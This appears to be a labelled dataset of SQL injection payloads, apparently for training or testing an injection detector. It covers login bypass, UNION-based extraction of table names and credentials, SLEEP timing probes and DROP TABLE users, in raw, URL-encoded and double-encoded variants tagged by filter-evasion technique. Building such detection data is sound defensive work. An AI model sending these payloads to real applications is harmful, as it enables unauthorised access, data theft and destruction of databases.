username%253D%2527%2BOR%2B%2527%2527%253D%2527%2526password%253D%2527%2BOR%2B%2527%2527%253D%2527,1,sqli_auth,standard,double_encoded,SQLI_AUTH_007,1f722b910174dc970aabb309ac2c55be,f048e1c07fd7f1b9727d9cd1f9f13f27,97
username%253Dadmin%2527%2B%2B--%2526password%253D123,1,sqli_auth,comment_dash_dash|ws_multi_space,double_encoded,SQLI_AUTH_001,d6c0f81d1cdf6a20354282009f6dc2d6,2d9e8cfb73b706046205fed473ac0868,52
username%253D%2527%252F%252A%252A%252FOR%252F%252A%252A%252F1%253D1%252F%252A%252A%252F--%2526password%253D123,1,sqli_auth,comment_dash_dash|ws_comment_ws,double_encoded,SQLI_AUTH_006,e124ab9bd5d9c3bea2e15145fb340652,04bde2a69d9dfeeba4931f6bb336f38b,110
username=admin%27%20or%20%271%27=%271'%20--&password%3Dpass,1,sqli_auth,case_var|comment_dash_dash|ws_url_space,partially_encoded,SQLI_AUTH_002,d43e6c6ecda8da3663b3997fafdec168,424ae45719a1dd9faa7b87506c7d28c4,59
username=admin'%20OR%20'1'='1'%20;--%20-&password=pass,1,sqli_auth,comment_semicolon_comment|ws_url_space,raw,SQLI_AUTH_002,999b8a3dcc8806c3062ddad3d225b3c8,3752e697443142d870065a02e6b539a3,54
username%253Dadmin%2527%2BOR%2B%25271%2527%253D%25271%2527%2B%252F%252A%2526password%253Dpass,1,sqli_auth,comment_block_comment,double_encoded,SQLI_AUTH_002,815ebf95b1d1d2ea5dea71c1c3864ee9,260d716da2601c6a188436a7848d5dcd,93
username=' or ''='&password=' OR ''='-- -,1,sqli_auth,case_var|comment_dash_dash_space,raw,SQLI_AUTH_007,c2faefc04fe2117f30c4c6b36b5b4397,c25c893a0f37f05bf684bed6eca43c60,41
"username%3D"" +Or++%221""%3D%221%22&password%3D""++Or++%221""%3D""1""",1,sqli_auth,case_var|ws_multi_space,partially_encoded,SQLI_AUTH_004,04c1201f81c1c31309faedb32c98b47c,f1bc4d14ac21f282f1569aabe7f6ca3f,63
id%3D1+UNION+SELECT+column_name%2Cnull,1,sqli_numeric,standard,url_encoded,SQLI_NUMERIC_003,ef78aa81118c61ebae1ebc004b23d892,8198a5f34e729cb3fe3dd4b7e3a9ef40,38
id%3D1%2Band%2BSLEEP%281%29%23,1,sqli_numeric,case_var|comment_hash|ws_plus,url_encoded,SQLI_NUMERIC_004,705e591477a5f7e63321672d2363bdfe,e0183184b1c79c1ef5da6979f9f6de23,30
id%3D1+AND+1%3D2,1,sqli_numeric,standard,url_encoded,SQLI_NUMERIC_007,53824c34976904aeb2aaec37ed056539,cf64f0c3a7d459fc2e5925da15e810b9,16
id%3D1%2BuNIon%2BSelect%2B1%2C2--%2B-,1,sqli_numeric,case_var|comment_dash_dash_space|ws_plus,url_encoded,SQLI_NUMERIC_003,8cb30bc979b1a82e637b9118c6b83a2b,dead41d4f8d96547381067a0526531f7,37
id%3D100%2Bor%2B1%3D1,1,sqli_numeric,case_var|ws_mixed_ws,url_encoded,SQLI_NUMERIC_006,2ae691b45c33f5d1bc49f0886c54656c,a29ca5d270cb2b903043a735091dfd44,21
id%253D1%2509OR%2509ASCII%2528%2527A%2527%2529%253D65,1,sqli_numeric,ws_tab,double_encoded,SQLI_NUMERIC_001,77c81cd22cfbad1079b6c3efc203b198,416fedfc8ef45b03d2882a5a15f1df75,53
id%253D1%253B%252520DROP%252520TABLE%252520users%253B--%252520-,1,sqli_numeric,case_var|comment_semicolon_comment|ws_url_space,double_encoded,SQLI_NUMERIC_005,0f050c2b49e872f98899d8a930826585,36e8ec7d528c003ad1c9c3f697aeb8be,63
id=1++anD+ 1%3D2%23,1,sqli_numeric,case_var|comment_hash|ws_multi_space,partially_encoded,SQLI_NUMERIC_007,da81fd26e2f261806b9503e6940ebd44,45349daa27af5a95d9b0ad532aec437d,19
id%253D100%2B%2BOR%2B%2B1%253D1%252F%252A,1,sqli_numeric,case_var|comment_block_comment|ws_multi_space,double_encoded,SQLI_NUMERIC_006,d8ee9cbed79c19151b4834a2b57bb220,cb749ccff71605437d213e310ba94227,41
id=100 OR+1%3D1,1,sqli_numeric,standard,partially_encoded,SQLI_NUMERIC_006,645ec62de4a99ff639d59c95095e67d1,200f8ef46786fad31c431dfcbdbd482c,15
id%3D1%3B+dRoP+tabLe+users--,1,sqli_numeric,case_var|comment_dash_dash,url_encoded,SQLI_NUMERIC_005,fb0f8f49d7f65138831622702883084f,77fc0172f6e71bd6af98082f12ea9f89,28
id%3D100%2BOR%2B1%3D1%23,1,sqli_numeric,case_var|comment_hash|ws_plus,url_encoded,SQLI_NUMERIC_006,c9b4c9e0efa9019e0cfc629a9b2dcab0,7802763788957122df4ebf56694875dd,24
id=1;+Drop tAble users%23,1,sqli_numeric,case_var|comment_hash|ws_space,partially_encoded,SQLI_NUMERIC_005,3a8c2d521219b0395da4d6a5ae95d25c,222d9d4bc1ea8a73fb1c92d165a7c97b,25
id=100 or 1=1--,1,sqli_numeric,case_var|comment_dash_dash,raw,SQLI_NUMERIC_006,4f2e84ebde25b0a192e48bfe34b751db,75895fb14626266c1ad88d375278f297,15
id=1 AND SLEEP(1)-- -,1,sqli_numeric,case_var|comment_dash_dash_space,partially_encoded,SQLI_NUMERIC_004,cea8695ec0c19fe4b61a7957b24180df,bec163b0ecddc20ce6bad0549be4c20d,21
id%253D1%252520AND%2525202%253E1,1,sqli_numeric,ws_url_space,double_encoded,SQLI_NUMERIC_002,1d7fd391325dc363fb9d7c350bb62b61,dfcfcd3ca033e09ec69e029b067a40b0,32
id%3D1++uNIoN++Select++table_name%2Ctable_schema--,1,sqli_numeric,case_var|comment_dash_dash|ws_multi_space,url_encoded,SQLI_NUMERIC_003,85c5fa7fd9d2ad108733b71bcd37e737,f745332fbe16a26054b730fb72a73c9f,50
id=1; DROP TABLE users,1,sqli_numeric,standard,raw,SQLI_NUMERIC_005,c90db0505e829ed331a92618aad28773,7d5a917441630aaf17f5933779a3da95,22
id=1+AnD+100<200,1,sqli_numeric,case_var|ws_plus,raw,SQLI_NUMERIC_002,4c55501edbe193f9011c5d225c7933ed,14c1bae154cbf70654e2c0463fad1640,16
id%253D100%2B%2BOR%2B%2B1%253D1,1,sqli_numeric,ws_multi_space,double_encoded,SQLI_NUMERIC_006,0fd49f0246469ced75b956bdd70f4d1f,fa3a6bde4ed69703d3b22a4c7d261086,31
id%3D100+OR+1%3D1%3B--+-,1,sqli_numeric,comment_semicolon_comment,url_encoded,SQLI_NUMERIC_006,1569c1e59fe325113cbaa5000f2fd601,a7e4e262c9d6af77c298205ba07c09a4,24
id%253D1%252520uNiOn%252520sELect%252520table_name%252Ctable_schema%252F%252A,1,sqli_numeric,case_var|comment_block_comment|ws_url_space,double_encoded,SQLI_NUMERIC_003,01d3d9543bffd2630bf4a9274127295d,97ff797a076200067396f34056e33d68,77
id%253D1%2BOR%2BASCII%2528%2527A%2527%2529%253D65,1,sqli_numeric,case_var,double_encoded,SQLI_NUMERIC_001,6d3bd1cf120ea0e28b54e34c2826d965,dcdcc13f4b67a4842493b51c57f2d57d,49
id%3D1%3B+DROP+TABLE+users--+-,1,sqli_numeric,case_var|comment_dash_dash_space,url_encoded,SQLI_NUMERIC_005,d56b4b7a6c8b9dfcd92bbe27443181c5,6eed3189d9405d1912211912e91ef4be,30
id%3D1+AND+2%3E1,1,sqli_numeric,standard,url_encoded,SQLI_NUMERIC_002,bb42953db6bb6085808d0e267ed05b8d,410e542baf49eb07b02d196e09c7b58a,16
id%253D1%253B%2509DroP%2509TABLE%2509users,1,sqli_numeric,case_var|ws_tab,double_encoded,SQLI_NUMERIC_005,a6e9900a9262e8402e983ed44580fc95,09740fd5d3e94ffaa70638b872e45e30,42
id=1 And 1=2,1,sqli_numeric,case_var,raw,SQLI_NUMERIC_007,ff3b83fd5e4529e8a20adba410fe96c1,fba40b2f5c00dd20abf2a03813b3dc0e,12
"id=1 UNION+SELECT 1,version()/%2A",1,sqli_numeric,comment_block_comment,partially_encoded,SQLI_NUMERIC_003,8c283e18512ef2e42ad41ee6f18f59b4,b5ac03ed4dfc8c6565e0b915f208272e,33
id%3D1	And	SLEEP(5),1,sqli_numeric,case_var|ws_tab,partially_encoded,SQLI_NUMERIC_004,fb1cba34b566afc6bcea40279b4cd80e,2c75c0cfed086563edf10900dbee26b7,19
id=1  and  1=2/*,1,sqli_numeric,case_var|comment_block_comment|ws_multi_space,raw,SQLI_NUMERIC_007,5eecfe95ecbaf7d8a985c8c85c20d263,6039613329310783b601b8b1783434ec,16
id=1+AND 1=2,1,sqli_numeric,ws_space,partially_encoded,SQLI_NUMERIC_007,72ac7398ee15c70e070fe4f007b05d5f,c91fa637d34df8dcaf65298316907cda,12
id%3D1+Union+select+1%2Cversion%28%29,1,sqli_numeric,case_var,url_encoded,SQLI_NUMERIC_003,a862ec5fa5c7dbca461ea8c747e41147,7dd1ae7f5d0c313e09184671441e1a27,37
id=1 AND SLEEP(5),1,sqli_numeric,ws_space,raw,SQLI_NUMERIC_004,3bc4b29789d741fd041d1a9738d337e8,8fad249b88f0817d6579282d10ec6d7c,17
id%3D1+and+SLEEP%2810%29,1,sqli_numeric,case_var,url_encoded,SQLI_NUMERIC_004,3ee7c1645010d59d61af9935fc5062cb,111bd16f8966fc1fe41c7ffdae72c23e,24
id=100 OR 1=1,1,sqli_numeric,standard,raw,SQLI_NUMERIC_006,b41ff526735be28a07fd3b36e32d82e8,cd7771021632b71ab3a3be93ca014795,13
id%3D1%2520OR%2520%27a%27%3D%27a%27%2F%2A,1,sqli_numeric,comment_block_comment|ws_url_space,url_encoded,SQLI_NUMERIC_001,a7450de122863f98f9f45da3fe9af949,1146d377bcb7031e3bcb5fe6fa4ea398,41
id=1 and 'a'='a',1,sqli_numeric,case_var,raw,SQLI_NUMERIC_002,3563ddf1c0044506f6b2fa55df674a6a,6a850f11195a2fc44a85a88ece286334,16
id%253D1%2BAnd%2BSLEEP%25282%2529--%2B-,1,sqli_numeric,case_var|comment_dash_dash_space,double_encoded,SQLI_NUMERIC_004,145689beeea3c682361228dcb40f2590,eeaa993be7645690dbbfdcdeb5bb28d6,39
id=100 or+1=1,1,sqli_numeric,case_var,partially_encoded,SQLI_NUMERIC_006,3c80dcaa289107bfd5df8dfeb547ea89,0824c7392efd4644356e598891b7b0a1,13
id%3D1+and+100%3C200%23,1,sqli_numeric,case_var|comment_hash|ws_space,url_encoded,SQLI_NUMERIC_002,c23a4da91bfcddf8f0a0c3ce31ad911b,bdf56c446e24d3b075a8a69f195ba832,23
id=1;%20DROP%20TABLE%20users,1,sqli_numeric,ws_mixed_ws,raw,SQLI_NUMERIC_005,5d49e92842e3960a5c4af4f582f82627,bbd3613ee297906d413b8b2e74603e53,28
id=1/**/and/**/ASCII('A')=65;--/**/-,1,sqli_numeric,case_var|comment_semicolon_comment|ws_comment_ws,raw,SQLI_NUMERIC_002,0e4f7062ffec9a64492a52d5226ea992,3471a8990c3535d3691415bc2df5c694,36
id=1%20and%20ASCII('A')=65,1,sqli_numeric,case_var|ws_url_space,raw,SQLI_NUMERIC_002,a5692c6070d84a737f74d97f02454486,b96dc88e3547f20c29ea6689f28527f7,26
id%253D1%2BANd%2BSLEEP%25282%2529--,1,sqli_numeric,case_var|comment_dash_dash,double_encoded,SQLI_NUMERIC_004,9811fcd5ebc3051c79f65b62fdb27cc1,9d6463ec93f517e62ef80251859bd88b,35
id%3D1+And+1%3D1%3B--+-,1,sqli_numeric,case_var|comment_semicolon_comment,url_encoded,SQLI_NUMERIC_002,8e4c5c2f9d3813cc302a4af46d5d3c43,b28f6cb03a16b6ef745e6f34460e430f,23
"id%3D1+UNION+SELECT+1,2%23",1,sqli_numeric,comment_hash|ws_plus,partially_encoded,SQLI_NUMERIC_003,cce142a0e58225cac9d65c0e404bf83f,479b51e68d857511180297ea6070ce14,26
id%3D1+OR+100%3C200,1,sqli_numeric,case_var|ws_space,url_encoded,SQLI_NUMERIC_001,417a663fe9f56d9da7f8dc3c4a1b714c,5973b8bbecdda1c547143c4032ca5031,19
id%3D1%2Bor%2B2%3E1%2523,1,sqli_numeric,case_var|comment_url_hash|ws_plus,url_encoded,SQLI_NUMERIC_001,98401423a728fb044f6ce1aeebd305a5,3c2be9ad34094d10bd5c01d10de0bda0,24
id%3D1+AND+SLEEP%285%29,1,sqli_numeric,standard,url_encoded,SQLI_NUMERIC_004,68f7b6c101ce5ff460c9ecbabe06ba62,ec7e22cb9a879b67e360c43fa6b630ac,23
id=1 AND SLEEP(5)%23,1,sqli_numeric,case_var|comment_url_hash,raw,SQLI_NUMERIC_004,6893c055773677429b048f5e94e3bd77,050dad613eb853f4b884aac8b8859e9e,20
id=1+AND 1=2--,1,sqli_numeric,case_var|comment_dash_dash|ws_space,partially_encoded,SQLI_NUMERIC_007,287459f4d1f3564cb8c888dd339390b9,24ad103cbad7f88c65171b3f0db1b7db,14
id%3D1%2BAND%2B1%3D2,1,sqli_numeric,ws_mixed_ws,url_encoded,SQLI_NUMERIC_007,cdaff552e713b2e58cbdcc3c6d6cf532,39e3d1aff1703ec2e746ed55c198b737,20
id%253D1%252F%252A%252A%252FaNd%252F%252A%252A%252F1%253D2--,1,sqli_numeric,case_var|comment_dash_dash|ws_comment_ws,double_encoded,SQLI_NUMERIC_007,c974593c9880356206ec0654d2120cfb,b327e3a4e87c31ef916894fb02063eca,60
"id=1 Union Select 1,version()",1,sqli_numeric,case_var,raw,SQLI_NUMERIC_003,4b71d5065b2c2c9fd0875b2f74e965cc,feee8fc44ed8873876e3d6950df8008c,29
id%253D1%2509OR%25092%253E1,1,sqli_numeric,ws_tab,double_encoded,SQLI_NUMERIC_001,ef8e9d42c2da5c006f078b178483596e,67efacd6712008cecaa59ccf019f95e4,27
id%253D1%252F%252A%252A%252Fand%252F%252A%252A%252F1%253D2%252523,1,sqli_numeric,case_var|comment_url_hash|ws_comment_ws,double_encoded,SQLI_NUMERIC_007,b735ce7d1eabacb892e5c5156d797ba7,26c972ed6eead9cfc78ea0b781e210d6,65
id%253D1%2BAND%2B1%253D2%2523,1,sqli_numeric,comment_hash,double_encoded,SQLI_NUMERIC_007,4045f3e19609722e840596e5cc6b0861,74ca2b88219e301eb5666bbc88ecbae0,29
id%3D100+Or+1%3D1--+-,1,sqli_numeric,case_var|comment_dash_dash_space,url_encoded,SQLI_NUMERIC_006,62b05a3c10c1229912d9d74523a61d05,1b5a366f73be92acd1047738b4611978,21
id=1 or 100<200/*,1,sqli_numeric,case_var|comment_block_comment,raw,SQLI_NUMERIC_001,f89afb5cd3e87ecd4d0f679ce79e09ee,e8cfd3cf79e6e17aa918a98c868e9b5a,17
id%3D1+++or+++100%3C200,1,sqli_numeric,case_var|ws_mixed_ws,url_encoded,SQLI_NUMERIC_001,214bebb8e4b93e66a18f12ab88ed298d,a9d342b7c7298867ad9c3aadda4879a3,23
id=1%2F%2A%2A/ANd%2F*%2A%2FSLEEP(1)%23,1,sqli_numeric,case_var|comment_hash|ws_comment_ws,partially_encoded,SQLI_NUMERIC_004,2322d767c31f69279eb5a26760665e04,9275040ab548e635bcb15e63a3de66f7,38
id=1	AND	LENGTH(%27test%27)%3D4--	-,1,sqli_numeric,comment_dash_dash_space|ws_tab,partially_encoded,SQLI_NUMERIC_002,552e45a5c7b459c0b761b8413f933cea,9e28231dc9f297a4fb4c48d9e23952e0,35
id=100  +or+ +1%3D1,1,sqli_numeric,case_var|ws_mixed_ws,partially_encoded,SQLI_NUMERIC_006,815031b4443a169e13c6c3b6d90cd808,eb3c8af70247676e2fd74ec93edec3d7,19
id%3D1+AND+LENGTH%28%27test%27%29%3D4,1,sqli_numeric,case_var,url_encoded,SQLI_NUMERIC_002,1896e078ac6d0140397491d3290545c2,44d37c8560606d47dc3039c0ac931a25,37
id%3D100+Or+1%3D1%2523,1,sqli_numeric,case_var|comment_url_hash,url_encoded,SQLI_NUMERIC_006,cdd33e64334138407df3767e0b94023f,d4fdb3fdd13fcdc3992d424aa9dcd670,22
id%3D100+OR+1%3D1,1,sqli_numeric,standard,url_encoded,SQLI_NUMERIC_006,6fefbd704592d99a0cbddf68fa264272,af9f8a53f9893f4ee15f593dd43bfbd1,17
id=1%20OR%201=1--%20-,1,sqli_numeric,case_var|comment_dash_dash_space|ws_url_space,raw,SQLI_NUMERIC_001,3707040ba880f72e7b2fbe46d87b6730,4c0d798b6d8138eee5afdc11c8dc3f13,21
id=1%20AND%20SLEEP(2)/*,1,sqli_numeric,comment_block_comment|ws_mixed_ws,raw,SQLI_NUMERIC_004,9e5f20df0a2e4806a3694dde60ee7113,167f8d59ffbe95b91a9ad861b0d51dbd,23
id%253D1%2509AND%25091%253D2,1,sqli_numeric,ws_tab,double_encoded,SQLI_NUMERIC_007,af6819bcc45c164d3a1ef3003ca51467,dbdf1609f1901b1a12cf0aba778c7bfb,28
id%253D1%252BAND%252B7%253D7,1,sqli_numeric,case_var|ws_plus,double_encoded,SQLI_NUMERIC_002,34ba4e351c3f85785084ef578927badc,096fcb5e71c4b454d5d010fb63ea923f,28
id=1 and 1=2;-- -,1,sqli_numeric,case_var|comment_semicolon_comment,raw,SQLI_NUMERIC_007,8025fff2decece9e985ae5fc40715dd8,97ffc1c9e172057c7fa17181675adaed,17
id%3D1+AnD+SLEEP(5)--,1,sqli_numeric,case_var|comment_dash_dash,partially_encoded,SQLI_NUMERIC_004,6d6f60c2c37b41c8b317aa6b62377cd5,6ab08e8e16f811dbdd8c245100cea903,21
id%3D1/%2A%2A%2FAND/%2A%2A/LENGTH('test%27)%3D4%2F*,1,sqli_numeric,comment_block_comment|ws_comment_ws,partially_encoded,SQLI_NUMERIC_002,f74f3b68a9654b39040c268da7abb7b3,e18724a8dbeaac196eb304d63a254964,51
id%253D1%2B%2BUNION%2B%2BSeLEcT%2B%2Buser%252Cpassword--,1,sqli_numeric,case_var|comment_dash_dash|ws_multi_space,double_encoded,SQLI_NUMERIC_003,e6218dd4b59fa79fbbd709965c3484a8,55cf1209320ee85962f59472b6362723,56
id=1+ and +1%3D2--,1,sqli_numeric,case_var|comment_dash_dash|ws_multi_space,partially_encoded,SQLI_NUMERIC_007,291f2ac144ede10724915efb1f9222c8,7a8c4be65ffcdb5fc1ce4ec5e26396dd,18
id=100%20OR%201=1/*,1,sqli_numeric,case_var|comment_block_comment|ws_url_space,raw,SQLI_NUMERIC_006,b14afced0435fb4233a2cd497ffe66cf,f93780ea6563036554d1827c03ce5eee,19
id=1++or++100%3C200,1,sqli_numeric,case_var|ws_multi_space,partially_encoded,SQLI_NUMERIC_001,1084442a7041d20da76c68d2deea5a71,bc47f57fd594c0063785e6265d41eb01,19
id=1 OR 100<200--,1,sqli_numeric,comment_dash_dash|ws_space,raw,SQLI_NUMERIC_001,fe073bfff0ac63db98031cb743623144,44c9b379d1ed8bcf0253284e250b2bad,17
id%3D1	ANd	1%3D2,1,sqli_numeric,case_var|ws_tab,partially_encoded,SQLI_NUMERIC_007,21b8fedaf5cea31505f488c200729247,c95019f2f764b42a0100b045b5957ccd,16
id=1/**/OR/**/1=1--,1,sqli_numeric,comment_dash_dash|ws_comment_ws,raw,SQLI_NUMERIC_001,f8d579645a9fd397d2f028c3e164ccbd,051828456a57ab8deb035cf4ae20d1be,19
id%3D1%3B%2F%2A%2A%2Fdrop%2F%2A%2A%2FTable%2F%2A%2A%2Fusers,1,sqli_numeric,case_var|ws_comment_ws,url_encoded,SQLI_NUMERIC_005,8698012ce474f3cca44eacafdddd1c31,d767ce9357e8466b923bf64495c5e200,59
id%3D1 AND SLEEP(2),1,sqli_numeric,standard,partially_encoded,SQLI_NUMERIC_004,e81f8aba09922dfbcb6defaf9e7470b2,e20a1fedb841d1b790760ba4cc661e0b,19
id=1%3B DROP+TABLE users,1,sqli_numeric,ws_space,partially_encoded,SQLI_NUMERIC_005,992eb2b8388778cd261f88783943e21f,0ea4a1c1dd47b061c6af922a62798a2e,24
id%3D1++Or++LENGTH%28%27test%27%29%3D4,1,sqli_numeric,case_var|ws_multi_space,url_encoded,SQLI_NUMERIC_001,c3ad681c81d1230e0f2c6c2279534609,ab8e174ad6a92ae98f93555e0046a231,38
"id=1 Union SELECT table_name,table_schema",1,sqli_numeric,case_var,raw,SQLI_NUMERIC_003,561d5174569f2d33171cbece74a6b5cc,6a459dbca8417a47651208af425e5702,41
id=1++And  SLEEP(2),1,sqli_numeric,case_var|ws_multi_space,partially_encoded,SQLI_NUMERIC_004,4da9698adac1b4d8d0236187f5187e04,8eeddc4b5cf4e5bc607dac7c4f5dc35d,19
id%3D100++Or +1%3D1,1,sqli_numeric,case_var|ws_multi_space,partially_encoded,SQLI_NUMERIC_006,b7d1fb45d492c856c4c83c2a37efc83d,752450bfe55f8b8daa8d9bae5f2f7241,19
id=1 Or+7%3D7,1,sqli_numeric,case_var,partially_encoded,SQLI_NUMERIC_001,db6c62f3d87d27b77c1eb17ed4437222,bc2f50125860f9035c843d02795c70df,13
id=1+OR+100%3C200,1,sqli_numeric,standard,partially_encoded,SQLI_NUMERIC_001,307d1f893b1d426b01ac174a94886bbd,44014a8af4356270dc9946c3ea843e17,17
id%3D1+AND+100%3C200,1,sqli_numeric,standard,url_encoded,SQLI_NUMERIC_002,85142f78c97b300106c555c63af3c0f6,b665aee7ccedee931c2a7e8bde8a84b8,20
id%3D1%09UNION%09SELECT%09column_name%2Cnull,1,sqli_numeric,ws_tab,url_encoded,SQLI_NUMERIC_003,67d778e0ec81dcc12823c096772cbc6c,912e72bfc92be194c3a0a27e34e2ec6a,44
"id=1+UNION+select+1,2%23",1,sqli_numeric,case_var|comment_url_hash|ws_plus,raw,SQLI_NUMERIC_003,095bd78a600e8cd366e9c945a0a145c8,02ff1c7f800b430a566729dd953c0c7a,24
id%3D1+AND+SLEEP%281%29--+-,1,sqli_numeric,case_var|comment_dash_dash_space,url_encoded,SQLI_NUMERIC_004,71860d2b9aa4936fb739368a83facceb,969bc9fa89eca529e369013284d653d0,27
id%253D1%2BOR%2B%2527a%2527%253D%2527a%2527%252F%252A,1,sqli_numeric,case_var|comment_block_comment,double_encoded,SQLI_NUMERIC_001,97d7ca635abe5489b079ae8ffee9f2ff,608c481d438020a171963bc93cd977fb,53
id%3D1;+ DROP  TABLE+ users--,1,sqli_numeric,case_var|comment_dash_dash|ws_multi_space,partially_encoded,SQLI_NUMERIC_005,c760a42d8e67243c9d03421f3dbfbfa4,0505c52a989383049abb548ea397dd00,29
id=1;  Drop  TABLE  users#,1,sqli_numeric,case_var|comment_hash|ws_multi_space,raw,SQLI_NUMERIC_005,246376eb9d5b2d2ac9b0da0e8f11444d,4e369104748302698e885da71a46a240,26
id=1 Or+CHAR(97)%3D%27a%27,1,sqli_numeric,case_var,partially_encoded,SQLI_NUMERIC_001,85706c240fc4979317c026853a09caca,ab61881685bd415cc8cbc42d61b792f8,26
id%253D1%253B%2BDROP%2BTABLE%2Busers,1,sqli_numeric,ws_space,double_encoded,SQLI_NUMERIC_005,15a5de05d0b0d6b728edfa07cfe0c086,727b7ed6af07ba79ab0367383f8c1ce6,36
id=1+OR+1=1%23,1,sqli_numeric,comment_url_hash|ws_plus,raw,SQLI_NUMERIC_001,33cde5917b3d77608642486f4070d283,baaf8e6cf828c8796e7d8126332aa71e,14
id%253D1%2B%2BOr%2B%2B%2527a%2527%253D%2527a%2527%252523,1,sqli_numeric,case_var|comment_url_hash|ws_multi_space,double_encoded,SQLI_NUMERIC_001,ef0090cdf3de3b75f294f83238076dd1,6d320adf78d80fab812c260d9a119a6b,56
name=test%27+|| %27a,1,sqli_string,case_var,partially_encoded,SQLI_STRING_004,264507e36a2e07699455b460a84d3f46,4c495fda5fecff4937983be4bd5ac581,20
name=test%27++++ 'a,1,sqli_string,case_var|ws_multi_space,partially_encoded,SQLI_STRING_005,2f6edeb4cead447bdcd1132caef44a36,9ca68a8baf8f62668c0b85e9b3ff74d3,19
name%3Dtest%27+AND+%27a%27%3D%27a--+-,1,sqli_string,comment_dash_dash_space,url_encoded,SQLI_STRING_001,6c977ba52afe38a33741a66637156832,024e5c684e0ffaabe84f5e3efd148a98,37
name=test' LIKE '%,1,sqli_string,ws_space,raw,SQLI_STRING_003,0382a80156dc2f86641c50c4fe67627a,4bc24b7f25e26f8d1d37217ffc4e4dc2,18
search%3Dapple%27%2520OR%2520%271%27%3D%271%23,1,sqli_string,case_var|comment_hash|ws_url_space,url_encoded,SQLI_STRING_006,e9801f2f37fd617f8c6d64c25cc1b204,9f67f0efea84a8ea1ce8b686213fd383,46
search=apple'+or+'1'='1,1,sqli_string,case_var|ws_plus,raw,SQLI_STRING_006,c75a9014e99c242b6214ad2f020684b1,c75a9014e99c242b6214ad2f020684b1,23
name%3Dtest%27%2B%7C%7C%2B%27a,1,sqli_string,case_var|ws_plus,url_encoded,SQLI_STRING_004,c013b56b0aca385cf56e22452e370abb,dc518e0b8f89a5ce66cc6da0c7c65cc3,30
name%3Dtest%27%2520AND%2520%27a%27%3D%27a--,1,sqli_string,comment_dash_dash|ws_mixed_ws,url_encoded,SQLI_STRING_001,f3b50bffcb1afa27635de9acc342077d,518efab3925bee741dd5e912deae201d,43
name%253Dtest%2527%2BAND%2B%2527a%2527%253D%2527a%252523,1,sqli_string,comment_url_hash,double_encoded,SQLI_STRING_001,30657f4042e136f49a4e421ee447be24,81edf8581a88690fdc4a934396444c3b,56
name%253Dtest%2527%2B%252B%2B%2527a%252F%252A,1,sqli_string,case_var|comment_block_comment,double_encoded,SQLI_STRING_005,2e74f3f0ddd4a345cd1ea4a999af1761,93992f4a7e75c64c7404590385f17833,45
name%253Dtest%2527%2B%252B%2B%2527a,1,sqli_string,case_var|ws_space,double_encoded,SQLI_STRING_005,baa3961883d9e0d35d951c28ca70884b,368a678f55b21704da139dd5f29bf7e9,35
name%3Dtest%27	||	%27a%2F%2A,1,sqli_string,case_var|comment_block_comment|ws_tab,partially_encoded,SQLI_STRING_004,0bcce2d80e48d97f5d216fb4aadb5c71,a30df630d01a1203a9bf2ff7b75b4228,28
name%3Dtest%27+LIKE+%27%25%2F%2A,1,sqli_string,comment_block_comment|ws_space,url_encoded,SQLI_STRING_003,b70b64ba0b6e856c550f87f00f38fb82,045b78482444d7f30e026783b45c99b4,32
name%253Dtest%2527%2B%252B%2B%2527a%253B--%2B-,1,sqli_string,comment_semicolon_comment,double_encoded,SQLI_STRING_005,a368670819ccf4387551eaad8dfa37fb,316224cd9f244bd869c326de556d385f,46
name%253Dtest%2527%2509%257C%257C%2509%2527a%252F%252A,1,sqli_string,case_var|comment_block_comment|ws_tab,double_encoded,SQLI_STRING_004,08fd2076d6baf809e51ce11c920ae405,a8e0416cd5a66866cc4315dfd4b8a5b9,54
name%253Dtest%2527%2BOR%2B%2527a%2527%253D%2527a%252F%252A,1,sqli_string,case_var|comment_block_comment,double_encoded,SQLI_STRING_002,aa811c99f63a7c30378a5453edf26fc2,36aaab24b0a0511befbbb3c363e5eb10,58
name%3Dtest%27%09OR%09%27a%27%3D%27a,1,sqli_string,ws_tab,url_encoded,SQLI_STRING_002,545da771b26b6bfb61a0ef0479c87286,bdc2fa601454b3ba56e3c8e93f8e3d80,36
name=test'	OR	'a'='a,1,sqli_string,case_var|ws_tab,raw,SQLI_STRING_002,98f926d467f8a533a3caccf167b90ca4,f41fd1303657895a1c7468ee22a41e60,20
name%253Dtest%2527%2BOR%2B%2527a%2527%253D%2527a,1,sqli_string,standard,double_encoded,SQLI_STRING_002,010e08208b192121c5d0e41aec977d92,dae924311bf51a4d823f737d423cd9ac,48
name%3Dtest'+++%27a,1,sqli_string,standard,partially_encoded,SQLI_STRING_005,081b9812e23747fdfe7f9bcfc171dcd3,e607a039660b69636dc44d470e44d646,19
name%3Dtest%27+|| %27a,1,sqli_string,case_var,partially_encoded,SQLI_STRING_004,d8bf702feb3879bdad5f773551918dba,cad277d22cfaf2bf5ee9b3cdf4622d2f,22
name=test' AND 'a'='a,1,sqli_string,standard,raw,SQLI_STRING_001,6dc49ddeb8175b7b7463e14f1f251630,da474617dc1345946ebccc5d9d36228f,21
name%253Dtest%2527%2B%2B%257C%257C%2B%2B%2527a%252F%252A,1,sqli_string,case_var|comment_block_comment|ws_multi_space,double_encoded,SQLI_STRING_004,b944cc1d052746a5f21220f97dec3fc4,4d581b8f44f2aaeabbd4aa02dfd8ceea,56
search=apple' or '1'='1,1,sqli_string,case_var,raw,SQLI_STRING_006,2a78213457fc6033fb0fa11bca6853a7,f8367b046cfba0ddd8ff63d7fbaef0a5,23
name=test' OR 'a'='a#,1,sqli_string,comment_hash,raw,SQLI_STRING_002,4cc9a1e2e8e062a0b0d484ae3d0284ec,1f030dd166c50399b7145357c28473ba,21
name%253Dtest%2527%2B%2BAND%2B%2B%2527a%2527%253D%2527a--%2B%2B-,1,sqli_string,comment_dash_dash_space|ws_multi_space,double_encoded,SQLI_STRING_001,356e44b57806962bcce61231c6a3a29b,f2cb284c5a8b2a19732fd18ac900c67e,64
name%3Dtest' And+%27a%27%3D'a,1,sqli_string,case_var,partially_encoded,SQLI_STRING_001,8c4470a1a8494e0a2f127e49f3f9dd91,d9eeecfc31ebc4eb0505d63856ac2571,29
name%3Dtest'	LIKE	%27%#,1,sqli_string,comment_hash|ws_tab,partially_encoded,SQLI_STRING_003,8d171f5db7fa7ae7bcf56e4015a5e886,a20cd844a594a7640a737ed5f12c71a9,23
name%3Dtest'++LIKE+ '%%23,1,sqli_string,case_var|comment_hash|ws_multi_space,partially_encoded,SQLI_STRING_003,3bbb0948e08ba7923811177c57c5d798,18a78276f8eef8956052ab86b51efae9,25
search=apple'+or %271%27=%271/%2A,1,sqli_string,case_var|comment_block_comment,partially_encoded,SQLI_STRING_006,994d251732af56bb65627411754d5013,565727595270c32eff97f53ecfee1c0e,33
